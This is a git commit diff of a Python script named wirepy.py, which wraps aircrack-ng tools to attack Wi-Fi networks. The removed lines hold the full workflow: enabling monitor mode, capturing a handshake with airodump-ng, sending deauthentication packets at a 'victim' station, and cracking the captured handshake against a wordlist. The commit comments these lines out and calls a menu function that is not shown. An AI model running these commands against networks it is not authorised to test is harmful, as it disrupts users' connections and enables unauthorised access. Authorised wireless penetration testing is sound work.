81e85c45d392da03122bc6ed95c5a6fee55c53f5
IdanMalihi <81778053+TraiLeR2@users.noreply.github.com>
2022-05-02 00:28:29 +0300

    Update wirepy.py

--- wirepy.py
+++ wirepy.py
@@ -1,57 +1,59 @@
 import os
 import time
-from function import banner
+from function import *
 
-banner = banner()
 enter = "\n"
 
 print("""{0}
-            *** The Script Was Created By Idan Malihi ***{1}""".format(banner,enter))
+            *** The Script Was Created By Idan Malihi ***{1}""".format(banner(),enter))
 
-print("Set up the adapter{0}".format(enter))
+menu()
 
-adapter = input("Enter your adapter's name > ")
-if adapter == False or adapter == None:
-    print("Your adapter's name does not exist, please check with 'iwconfig' command.")
-else:
-    pass
 
-print("{0}Checking if there are any problematic PPID........................... (Press Enter){0}".format(enter))
+#print("Set up the adapter{0}".format(enter))
 
-os.system("kill all")
-print("All PPID have been deleted.{0}".format(enter))
+#adapter = input("Enter your adapter's name > ")
+#if adapter == False or adapter == None:
+#    print("Your adapter's name does not exist, please check with 'iwconfig' command.")
+    #else:
+    #    pass
 
-print("Let's Enable Monitor Mode!{0}".format(enter))
-os.system("ifconfig {0} down && iwconfig {0} mode monitor && ifconfig {0} up".format(adapter))
-print("Mode Monitor in {0} has changed successfully!{1}".format(adapter, enter))
+#print("{0}Checking if there are any problematic PPID........................... (Press Enter){0}".format(enter))
 
-print("Press CTRL + C When you Finish the SCAN! *IMPORTANT* ")
+#os.system("kill all")
+#print("All PPID have been deleted.{0}".format(enter))
 
-time.sleep(5)
+#print("Let's Enable Monitor Mode!{0}".format(enter))
+#os.system("ifconfig {0} down && iwconfig {0} mode monitor && ifconfig {0} up".format(adapter))
+#print("Mode Monitor in {0} has changed successfully!{1}".format(adapter, enter))
 
-os.system("airodump-ng {0}".format(adapter))
+#print("Press CTRL + C When you Finish the SCAN! *IMPORTANT* ")
 
-print("Your adapter's name does not exist, please check with 'iwconfig' command.")
+#time.sleep(5)
 
-bssid_name = input("Enter BSSID Name > ")
-channel = input("{0}Enter channel > ".format(enter))
-bssid = input("{0}Enter BSSID > ".format(enter))
+#os.system("airodump-ng {0}".format(adapter))
 
-os.system("airodump-ng -c {0} --bssid {1} {2} -w /root/Desktop/{2}".format(channel, bssid, bssid_name))
-time.sleep(5)
+#print("Your adapter's name does not exist, please check with 'iwconfig' command.")
 
-print("PCAP file saved in /root/Desktop{0}".format(enter))
+#bssid_name = input("Enter BSSID Name > ")
+#channel = input("{0}Enter channel > ".format(enter))
+#bssid = input("{0}Enter BSSID > ".format(enter))
 
-packets = int(input("Enter Number of Attacks (10-100) > "))
-victim = input("Enter Victim's Station > ")
+#os.system("airodump-ng -c {0} --bssid {1} {2} -w /root/Desktop/{2}".format(channel, bssid, bssid_name))
+#time.sleep(5)
 
-os.system("aireplay-ng --deauth {0} -a {1} -c {2} {3}".format(packets, bssid, victim, bssid_name))
+#print("PCAP file saved in /root/Desktop{0}".format(enter))
 
-time.sleep(5)
+#packets = int(input("Enter Number of Attacks (10-100) > "))
+#victim = input("Enter Victim's Station > ")
 
-pcap_file_path = input("Enter PCAP File Path > ")
-wordlist_path = input("{0}Enter Wordlist Path > ".format(enter))
+#os.system("aireplay-ng --deauth {0} -a {1} -c {2} {3}".format(packets, bssid, victim, bssid_name))
 
-os.system("aircrack-ng -w {0} {1}".format(wordlist_path, pcap_file_path))
+#time.sleep(5)
 
-print("Done")
+#pcap_file_path = input("Enter PCAP File Path > ")
+#wordlist_path = input("{0}Enter Wordlist Path > ".format(enter))
+
+#os.system("aircrack-ng -w {0} {1}".format(wordlist_path, pcap_file_path))
+
+#print("Done")
